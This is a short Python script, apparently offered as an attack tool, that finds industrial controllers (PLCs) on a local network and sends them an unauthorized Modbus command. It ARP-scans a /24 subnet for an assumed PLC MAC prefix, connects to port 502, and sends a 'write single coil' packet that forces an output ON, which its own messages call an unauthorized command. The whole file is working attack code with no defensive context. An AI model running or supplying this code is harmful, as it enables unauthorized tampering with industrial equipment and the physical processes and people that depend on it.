from scapy.all import ARP, Ether, srp
import socket
import struct

def discover_plc_ip():
    # Define the IP range to scan (e.g., 192.168.1.0/24)
    ip_range = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find PLCs (assuming PLCs have a specific MAC prefix)
    plc_ip = None
    for sent, received in result:
        if received.hwsrc.startswith("00:1B:1E"):  # Example MAC prefix for PLCs
            plc_ip = received.psrc
            print(f"Discovered PLC at IP: {plc_ip}")
            break

    if not plc_ip:
        print("No PLC found in the network.")
    return plc_ip

def send_unauthorized_command(plc_ip, port=502):
    # Example: Send a Modbus command to the PLC
    # This is a simple example and may need to be adapted for specific PLCs
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((plc_ip, port))

        # Example Modbus/TCP payload (write coil command)
        # Transaction ID: 0x0001, Protocol ID: 0x0000, Length: 0x0006, Unit ID: 0x01
        # Function Code: 0x05 (Write Single Coil), Address: 0x0001, Value: 0xFF00 (ON)
        payload = struct.pack(">HHHBBHH", 0x0001, 0x0000, 0x0006, 0x01, 0x05, 0x0001, 0xFF00)

        # Send the command
        sock.send(payload)
        print(f"Sent unauthorized command to PLC at {plc_ip}")

        # Receive response (optional)
        response = sock.recv(1024)
        print(f"Received response: {response.hex()}")

    except Exception as e:
        print(f"Error sending command: {e}")

    finally:
        sock.close()

if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()

    if plc_ip:
        # Step 2: Send an unauthorized command to the PLC
        send_unauthorized_command(plc_ip)